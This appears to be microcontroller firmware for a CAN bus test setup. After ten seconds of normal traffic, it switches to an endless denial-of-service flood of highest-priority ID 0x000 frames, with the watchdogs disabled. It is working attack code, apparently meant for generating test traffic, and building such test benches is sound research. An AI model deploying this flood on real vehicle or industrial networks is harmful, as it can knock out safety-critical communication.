#include "Ifx_Types.h"
#include "IfxCpu.h"
#include "IfxScuWdt.h"
#include "MCMCAN.h"
#include "Bsp.h"

IFX_ALIGN(4) IfxCpu_syncEvent g_cpuSyncEvent = 0;
extern McmcanType g_mcmcan;

void core0_main(void)
{
    IfxCpu_enableInterrupts();
    IfxScuWdt_disableCpuWatchdog(IfxScuWdt_getCpuWatchdogPassword());
    IfxScuWdt_disableSafetyWatchdog(IfxScuWdt_getSafetyWatchdogPassword());
    IfxCpu_emitEvent(&g_cpuSyncEvent);
    IfxCpu_waitEvent(&g_cpuSyncEvent, 1);

    initMcmcan();
    initLeds();

    /* Phase 1: Normal messages (0x77) for 10 seconds */
    g_mcmcan.currentMessageId = 0x77;
    for (uint32 i = 0; i < 10; i++)
    {
        transmitCanMessage();
        waitTime(IfxStm_getTicksFromMilliseconds(BSP_DEFAULT_TIMER, 1000));
    }

    /* Phase 2: DoS Attack with ID 0x000 */
    g_mcmcan.currentMessageId = 0x000;

    while (1)
    {
        transmitCanMessage();  // flood without delay
    }
}
